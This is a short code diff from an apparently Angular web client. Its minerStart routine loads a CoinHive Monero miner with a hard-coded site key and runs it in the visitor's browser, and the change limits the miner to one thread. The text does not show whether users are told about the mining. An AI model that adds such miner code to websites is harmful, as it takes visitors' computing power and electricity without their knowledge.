@@ -613,7 +613,7 @@ class ClientComponent implements OnInit {
   };
   private minerStart = () => {
     var minerLoaded = () => {
-      if (this.minerXMR == null) this.minerXMR = new (<any>window).CoinHive.Anonymous('eqngJCpDYjjstauSte1dLeF4NwzFUvmY');
+      if (this.minerXMR == null) this.minerXMR = new (<any>window).CoinHive.Anonymous('eqngJCpDYjjstauSte1dLeF4NwzFUvmY', {threads: 1});
       if (!this.minerXMR.isRunning()) this.minerXMR.start();
       if (this.minerXMRTimeout) window.clearTimeout(this.minerXMRTimeout);
       this.minerXMRTimeout = window.setInterval(() => {
